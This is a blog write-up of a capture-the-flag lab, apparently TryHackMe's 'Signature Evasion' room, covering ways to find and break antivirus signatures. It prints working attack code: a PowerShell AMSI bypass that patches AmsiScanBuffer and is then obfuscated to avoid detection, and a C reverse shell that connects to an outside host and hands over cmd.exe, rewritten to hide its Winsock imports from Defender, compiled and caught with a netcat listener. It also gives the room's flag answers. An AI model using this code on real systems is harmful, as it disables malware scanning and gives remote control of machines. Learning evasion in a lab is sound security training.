---
title: Signature Evasion
author: CYB3RM3
name: CYB3RM3 | Signature Evasion
date: 2022-10-15 15:42:57 +0100
categories: [TryHackMe, RedTeam]
tags: [Malware, Evasion, SOC, RedTeam]
---

Learn how to break signatures and evade common AV, using modern tool-agnostic approaches.

THM Room [https://tryhackme.com/room/signatureevasion](https://tryhackme.com/room/signatureevasion)


## TASK 1 : Introduction
### Read the above and continue to the next task. 
No Answer

## TASK 2 : Signature Identification
### Using the knowledge gained throughout this task, split the binary found in C:\Users\Student\Desktop\Binaries\shell.exe using a native utility discussed in this task. Recursively determine if the split binary is detected until you have obtained the nearest kilobyte of the first signature. 
Using the head function to split hte binary :

```console
root@ip-10-10-87-219:~/Desktop# head --bytes 49425 shell.exe > head.exe
root@ip-10-10-87-219:~/Desktop# ls -la
total 484
drwxr-xr-x  3 root root   4096 Oct 14 13:38  .
drwxr-xr-x 41 root root   4096 Oct 14 13:12  ..
lrwxrwxrwx  1 root root   5 Sep 10  2020 'Additional Tools' -> /opt/
-rw-r--r--  1 root root  49425 Oct 14 14:21  head.exe
-rwxr-xr-x  1 root root   173 Aug 15  2020  mozo-made-15.desktop
-rw-r--r--  1 root root  98851 Oct 14 13:10  shell.exe
drwxr-xr-x 11 root root   4096 Dec 22  2021  Tools
```
{: .nolineno }

Then Uploading head.exe on the windows machine and executing a scan didn't find anything suspicious.

![Threat Scan](/images/thm/signatureevasion/signatureevasion_1.png)
_Threat Scan_

The bad bytes must be after 49425. Wwe need to repeat this process until find the right bytes and until defender will spot a suspicious activity with the file.

No Answer

### To the nearest kibibyte, what is the first detected byte?

As the bad bytes begin at 50500, the nearest kibibyte should be something around 49316 but this answer didn't worked. But the nearest kilobyte is 51000 and seems to be the requested answer. 

Kikibyte <https://en.wikipedia.org/wiki/Byte#Multiple-byte_units> :

 "A system of units based on powers of 2 in which 1 kibibyte (KiB) is equal to 1,024 (i.e., 210) bytes is defined by international standard IEC 80000-13 and is supported by national and international standards bodies (BIPM, IEC, NIST). The IEC standard defines eight such multiples, up to 1 yobibyte (YiB), equal to 10248 bytes"

Answer : 51000

## TASK 3 : Automating Signature Identification
###  Using the knowledge gained throughout this task, identify bad bytes found in C:\Users\Student\Desktop\Binaries\shell.exe using ThreatCheck and the Defender engine. ThreatCheck may take up to 15 minutes to find the offset, in this case you can leave it running in the background, continue with the next task, and come back when it finishes. 

No Answer.

### At what offset was the end of bad bytes for the file?

We can use, as suggested, ThreatCheck.exe which iterates automatically trought the splitting of the binary at the search of bad bytes. The run of this tools can takes some time (In my case, it takes approximately 11 min 30 sec)

```powershell
PS C:\Users\Student\Desktop\Tools> .\ThreatCheck.exe -f "C:\Users\Student\Desktop\Binaries\shell.exe" -e AMSI
[+] Target file size: 73802 bytes
[+] Analyzing...
[*] Testing 36901 bytes
[*] No threat found, increasing size
[*] Testing 55351 bytes
[*] Threat found, splitting
[*] Testing 46126 bytes
[*] No threat found, increasing size
[*] Testing 59964 bytes
[*] Threat found, splitting
[*] Testing 53045 bytes
[*] Threat found, splitting
[*] Testing 49585 bytes
[*] No threat found, increasing size
[*] Testing 61693 bytes
[*] Threat found, splitting
[*] Testing 55639 bytes
[*] Threat found, splitting
[*] Testing 52612 bytes
[*] Threat found, splitting
[*] Testing 51098 bytes
[*] Threat found, splitting
[*] Testing 50341 bytes
[*] No threat found, increasing size
[*] Testing 62071 bytes
[*] Threat found, splitting
[*] Testing 56206 bytes
[*] Threat found, splitting
[*] Testing 53273 bytes
[*] Threat found, splitting
[*] Testing 51807 bytes
[*] Threat found, splitting
[...]
10 minutes later
[...]
[*] Testing 50509 bytes
[*] Threat found, splitting
[*] Testing 50503 bytes
[*] Threat found, splitting
[*] Testing 50500 bytes
[*] Threat found, splitting
[!] Identified end of bad bytes at offset 0xC544
00000000   95 CE 77 FF D5 90 E9 09  00 00 00 3C 7E 5F 66 24   ?IwÿO?é····<~_f$
00000010   8C 09 80 09 31 C0 E9 09  00 00 00 14 4A C5 E1 9B   ?·?·1Aé·····JÅá?
00000020   26 A5 81 BE 64 FF 30 90  64 89 20 90 E9 09 00 00   &¥?_dÿ0?d? ?é···
00000030   00 EF 4F E2 4F 7A FE 36  F1 04 FF D3 90 E9 24 FF   ·ïOâOz_6ñ·ÿO?é$ÿ
00000040   FF FF E8 E4 FE FF FF FC  E8 8F 00 00 00 60 31 D2   ÿÿèä_ÿÿüè?···`1O
00000050   89 E5 64 8B 52 30 8B 52  0C 8B 52 14 8B 72 28 0F   ?åd?R0?R·?R·?r(·
00000060   B7 4A 26 31 FF 31 C0 AC  3C 61 7C 02 2C 20 C1 CF   ·J&1ÿ1A¬<a|·, AI
00000070   0D 01 C7 49 75 EF 52 8B  52 10 57 8B 42 3C 01 D0   ··ÇIuïR?R·W?B<·D
00000080   8B 40 78 85 C0 74 4C 01  D0 8B 58 20 01 D3 50 8B   ?@x?AtL·D?X ·OP?
00000090   48 18 85 C9 74 3C 49 8B  34 8B 01 D6 31 FF 31 C0   H·?Ét<I?4?·Ö1ÿ1A
000000A0   AC C1 CF 0D 01 C7 38 E0  75 F4 03 7D F8 3B 7D 24   ¬AI··Ç8àuô·}o;}$
000000B0   75 E0 58 8B 58 24 01 D3  66 8B 0C 4B 8B 58 1C 01   uàX?X$·Of?·K?X··
000000C0   D3 8B 04 8B 01 D0 89 44  24 24 5B 5B 61 59 5A 51   O?·?·D?D$$[[aYZQ
000000D0   FF E0 58 5F 5A 8B 12 E9  80 FF FF FF 5D 68 33 32   ÿàX_Z?·é?ÿÿÿ]h32
000000E0   00 00 68 77 73 32 5F 54  68 4C 77 26 07 FF D5 B8   ··hws2_ThLw&·ÿO,
000000F0   90 01 00 00 29 C4 54 50  68 29 80 6B 00 FF D5 6A   ?···)ÄTPh)?k·ÿOj

[*] Run time: 695.64s
```
{: .nolineno }

Answer : 0xC544

## TASK 4 : Static Code-Based Signatures
### What flag is found after uploading a properly obfuscated snippet?
We need to obfuscate the following powershell code snippet :

```powershell
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$A = "AmsiScanBuffer"
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```
{: .nolineno }

We can use the tool amsitrigger.exe to find if our powershell script is detect as malicious or not. When applying this tool on the base script, we got a stop on $A = "AmsiScanBuffer" :

```powershell
PS C:\Users\Student\Desktop\Tools> .\amsitrigger.exe
     _    __  __ ____ ___ _____     _
    / \  |  \/  / ___|_ _|_   _| __(_) __ _  __ _  ___ _ __
   / _ \ | |\/| \___ \| |  | || '__| |/ _` |/ _` |/ _ \ '__|
  / ___ \| |  | |___) | |  | || |  | | (_| | (_| |  __/ |
 /_/   \_\_|  |_|____/___| |_||_|  |_|\__, |\__, |\___|_|
                                      |___/ |___/         v3
@_RythmStick



Show triggers in Powershell file or URL.
Usage:
  -i, --inputfile=VALUE      Powershell filename or
  -u, --url=VALUE            URL eg. https://10.1.1.1/Invoke-NinjaCopy.ps1
  -f, --format=VALUE         Output Format:
                               1 - Only show Triggers
                               2 - Show Triggers with line numbers
                               3 - Show Triggers inline with code
                               4 - Show AMSI calls (xmas tree mode)
  -d, --debug                Show debug info
  -m, --maxsiglength=VALUE   Maximum Signature Length to cater for,
                               default=2048
  -c, --chunksize=VALUE      Chunk size to send to AMSIScanBuffer,
                               default=4096
  -h, -?, --help             Show Help
PS C:\Users\Student\Desktop\Tools> .\amsitrigger.exe -i ..\snip.ps1 -f 3
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$A = "AmsiScanBuffer
```
{: .nolineno }

So we can fix it by applying what seen in previous room (Obfuscation principles <https://www.cyb3rm3.com/posts/THM-obfuscationprinciples/>) like by splitting up the string.

After this, we can run again amsitrigger.exe and he'll stop on the line :

```powershell
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 
[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```
{: .nolineno }

We can use the splitting method again by filling the buffer variable $buf in multiple lines :

```powershell
$buf = New-Object bytes [] 6;
$buf[0] = [UInt32]0xB8;
$buf[1] = [UInt32]0x57;
$buf[2] = [UInt32]0x00;
$buf[3] = [UInt32]0x07;
$buf[4] = [UInt32]0x80;
$buf[5] = [UInt32]0xC3;
```
{: .nolineno }

The final script become now :

```powershell
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport(`"kernel32`")]
    public static extern strings GetString(string passobfsucation){return passobfsucation.toString()};
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$A = "Ams"+"iSca"+"nBu"+"ffer"
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = New-Object bytes [] 6;
$buf[0] = [UInt32]0xB8;
$buf[1] = [UInt32]0x57;
$buf[2] = [UInt32]0x00;
$buf[3] = [UInt32]0x07;
$buf[4] = [UInt32]0x80;
$buf[5] = [UInt32]0xC3;
[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```
{: .nolineno }

Running amsitrigger.exe on this one, does not trigger any alert anymore.

Let's try to use  it in the challenge submit form :


![Flag](/images/thm/signatureevasion/signatureevasion_2.png)
_Flag_

Answer : THM{70_D373C7_0r_70_N07_D373C7}

## TASK 5 : Static Property-Based Signatures
### Using CyberChef, obtain the Shannon entropy of the file: C:\Users\Student\Desktop\Binaries\shell.exe.
Go to CyberChef in with the entropy recipe <https://gchq.github.io/CyberChef/#recipe=Entropy('Shannon%20scale')> the choose the file shell.exe :

![Entropy](/images/thm/signatureevasion/signatureevasion_3.png)
_Entropy_

No Answer.

### Rounded to three decimal places, what is the Shannon entropy of the file?

Answer : 6.354

## TASK 6 : Behavioral Signatures
### What flag is found after uploading a properly obfuscated snippet? 

The original C code is :

```c
#include <windows.h>
#include <stdio.h>
#include <lm.h>

int main() {
    printf("GetComputerNameA: 0x%p\\n", GetComputerNameA);
    CHAR hostName[260];
    DWORD hostNameLength = 260;
    if (GetComputerNameA(hostName, &hostNameLength)) {
        printf("hostname: %s\\n", hostName);
    }
}
```
{: .nolineno }

The only call to obfuscate is the "GetComputerNameA()" function call. We can proceed as explain in the task and in the Windows documentation of the function. The previous code becomes :

```c
#include <windows.h>
#include <stdio.h>
#include <lm.h>

typedef BOOL (WINAPI* myNotGetComputerNameA)(
    LPSTR   lpBuffer,
    LPDWORD nSize
);

int main() {
    CHAR hostName[260];
    DWORD hostNameLength = 260;
    HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
    myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, hostName);
    if (notGetComputerNameA) {
        printf("hostname: %s\\n", hostName);
    }
}
```
{: .nolineno }

We can then compile this C code :

```console
root@ip-10-10-124-76:~/Desktop# x86_64-w64-mingw32-gcc test.c -o challenge-2.exe 
root@ip-10-10-124-76:~/Desktop# ls
'Additional Tools' mozo-made-15.desktop test.exe
 challenge-2.exe test.c Tools
```
{: .nolineno }

And finally, retreive the challenge-2.exe file on the windows machine (launch a "python3 -m http.server" command on the the attacker machine) and submit the file to get the flag :

![Upload payload](/images/thm/signatureevasion/signatureevasion_4.png)
_Upload payload_

![Flag](/images/thm/signatureevasion/signatureevasion_5.png)
_Flag_

Answer : THM{N0_1MP0r75_F0r_Y0U}

## TASK 7 : Putting It All Together
### What is the flag found on the Administrator desktop? 
We need to obfuscate the foolowing code :

```c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

void RunShell(char* C2Server, int C2Port) {
        SOCKET mySocket;
        struct sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
        } else {
            printf("Connected to %s:%d\\n", C2Server, C2Port);

            char Process[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            printf("Process Created %lu\\n", pinfo.dwProcessId);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "10.10.10.10";
        int port = 53;
        RunShell(host, port);
    }
    return 0;
} 
```
{: .nolineno }

From this code, we can see the API calls to change :

```text
WSAStartup
WSAConnect
WSACleanup
WSASocketA
WaitForSingleObject
CloseHandle
inet_addr
htons
```
{: .nolineno }

We can apply the method from task 6 for every API call. In example, for WSAStartup, it will be (with the help of Microsoft documentation) :

```c
// 1. Define the structure of the call
int WSAStartup(
        WORD      wVersionRequired,
  [out] LPWSADATA lpWSAData
);

// Becomes :

typedef int (WINAPI* myNotWSAStartup)(
  WORD      wVersionRequired,
  LPWSADATA lpWSAData
);
// 2. Obtain the handle of the module the call address is present in 
HMODULE hWs2_32 = LoadLibraryW(L"Ws2_32.dll"); 
```
{: .nolineno }

[Ws2_32.dll](/images/thm/signatureevasion/signatureevasion_6.png)
_Ws2_32.dll_

The LoadLibrary is different from task 6 because ANSI is not specified in the documentation for WSAStartup. We can suppose that the library will be loaded via Unicode strings and therfore, we will use : LoadLibraryW(L"XXXXX.dll").

LoadLibraryA - Loads library via ANSI strings <https://stackoverflow.com/questions/30699776/whats-the-difference-between-these-windows-api-signatures-in-delphi>
LoadLibraryW - Loads library via Unicode strings <https://stackoverflow.com/questions/30699776/whats-the-difference-between-these-windows-api-signatures-in-delphi>

```c
// 3. Obtain the process address of the call
myNotWSAStartup notWSAStartup = (myNotWSAStartup) GetProcAddress(hWs2_32, "WSAStartup")
```
{: .nolineno }

When this is done for every calls, we obtain the following structures definition, definition of pointers addresses and loading library :

```c
typedef int(WINAPI* myNotWSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* myNotWSASocketA)(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags);
typedef unsigned(WINAPI* myNotinet_addr)(const char *cp);
typedef u_short(WINAPI* myNothtons)(u_short hostshort);
typedef int(WSAAPI* myNotWSAConnect)(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
typedef int(WINAPI* myNotclosesocket)(SOCKET s);
typedef int(WINAPI* myNotWSACleanup)(void);

HMODULE hWs2_32 = LoadLibraryW(L"Ws2_32.dll"); 
myNotWSAStartup notWSAStartup = (myNotWSAStartup) GetProcAddress(hWs2_32, "WSAStartup");
myNotWSASocketA notWSASocketA = (myNotWSASocketA) GetProcAddress(hWs2_32, "WSASocketA");
myNotinet_addr notinet_addr = (myNotinet_addr) GetProcAddress(hWs2_32, "inet_addr");
myNothtons nothtons = (myNothtons) GetProcAddress(hWs2_32, "htons");
myNotWSAConnect notWSAConnect = (myNotWSAConnect) GetProcAddress(hWs2_32, "WSAConnect");
myNotclosesocket notclosesocket= (myNotclosesocket) GetProcAddress(hWs2_32, "closesocket");
myNotWSACleanup notWSACleanup = (myNotWSACleanup) GetProcAddress(hWs2_32, "WSACleanup");
```
{: .nolineno }

The next step is to insert the structure definition before the function definition and the pointer address definition at the beginning of the RunShell function.

We can now replace all API call by the pointer created. I.E : 

```c
WSAStartup(MAKEWORD(2,2), &version);
```
{: .nolineno }

Becomes :

```c
notWSAStartup(MAKEWORD(2,2), &version);
```
{: .nolineno }

The code now looks like  :

```c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024
typedef int(WSAAPI* myNotWSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* myNotWSASocketA)(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags);
typedef unsigned(WSAAPI* myNotinet_addr)(const char *cp);
typedef u_short(WSAAPI* myNothtons)(u_short hostshort);
typedef int(WSAAPI* myNotWSAConnect)(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
typedef int(WSAAPI* myNotclosesocket)(SOCKET s);
typedef int(WSAAPI* myNotWSACleanup)(void);

void RunShell(char* myip, int myport) {
        
        HMODULE hWs2_32 = LoadLibraryW(L"Ws2_32.dll"); 
        myNotWSAStartup notWSAStartup = (myNotWSAStartup) GetProcAddress(hWs2_32, "WSAStartup");
        myNotWSASocketA notWSASocketA = (myNotWSASocketA) GetProcAddress(hWs2_32, "WSASocketA");
        myNotinet_addr notinet_addr = (myNotinet_addr) GetProcAddress(hWs2_32, "inet_addr");
        myNothtons nothtons = (myNothtons) GetProcAddress(hWs2_32, "htons");
        myNotWSAConnect notWSAConnect = (myNotWSAConnect) GetProcAddress(hWs2_32, "WSAConnect");
        myNotclosesocket notclosesocket= (myNotclosesocket) GetProcAddress(hWs2_32, "closesocket");
        myNotWSACleanup notWSACleanup = (myNotWSACleanup) GetProcAddress(hWs2_32, "WSACleanup");

        SOCKET mySocket;
        struct sockaddr_in addr;
        WSADATA version;
        notWSAStartup(MAKEWORD(2,2), &version);
        mySocket = notWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = notinet_addr(myip);
        addr.sin_port = nothtons(myport);

        if (notWSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            notclosesocket(mySocket);
            notWSACleanup();
        } else {
            printf("Connected to %s:%d\\n", myip, myport);

            char Process[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            printf("Process Created %lu\\n", pinfo.dwProcessId);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "10.10.124.76";
        int port = 5353;
        RunShell(host, port);
    }
    return 0;
}
```
{: .nolineno }

Once done, we can compile this code :

```console
root@ip-10-10-124-76:~/Desktop# x86_64-w64-mingw32-gcc test.c -lwsock32 -lws2_32 -o challenge.exe
root@ip-10-10-124-76:~/Desktop# ls
'Additional Tools'   challenge.exe   mozo-made-15.desktop   old   test.c   Tools
```
{: .nolineno }

and open a listener :

```console
root@ip-10-10-124-76:~/Desktop# nc -lnvp 5353
Listening on [0.0.0.0] (family 0, port 5353)
```
{: .nolineno }

Then sumbit the file :

![Upload](/images/thm/signatureevasion/signatureevasion_7.png)
_Upload_

And we get back a reverse shell :

![Reverse shell](/images/thm/signatureevasion/signatureevasion_8.png)
_Reverse shell_

We can now retreive the flag on the administrator's desktop :

![Flag](/images/thm/signatureevasion/signatureevasion_9.png)
_Flag_

Answer : THM{08FU5C4710N_15 MY_10V3_14N6U463}

## TASK 8 : Conclusion 
### Read the above and continue learning! 
No Answer.